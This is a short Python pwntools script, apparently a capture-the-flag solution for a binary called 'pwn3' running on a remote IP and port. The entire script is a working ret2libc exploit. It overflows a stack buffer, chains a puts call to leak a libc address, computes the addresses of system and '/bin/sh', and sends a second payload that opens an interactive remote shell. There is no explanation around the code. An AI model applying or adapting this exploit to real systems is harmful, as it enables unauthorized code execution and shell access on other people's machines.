from pwn import *

r = remote("104.154.106.182",4567)
e = ELF("./pwn3")

puts_plt = e.plt["puts"]
puts_got = e.got["puts"]
main = 0x0804847d

system_offset = 0x40310
bin_sh_offset = 0x162d4c
puts_offset = 0x657e0
print(e.plt)

pr = 0x0804853f

# Make payload
payload = "A"*0x80+"A"*12

payload += p32(puts_plt)
payload += p32(pr)
payload += p32(puts_got)
payload += p32(main)

# Get puts_libc_addr
r.recv(1024)
r.sendline(payload)

puts_libc = r.recv(4)
puts_libc = u32(puts_libc, endian="little")
r.recv(1024)

# Set system_addr
libc_base = puts_libc - puts_offset
system_addr = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset

# Make Last Payload
payload = "A"*0x80+"A"*12

payload += p32(system_addr)
payload += p32(main)
payload += p32(bin_sh_addr)

r.sendline(payload)

r.interactive()
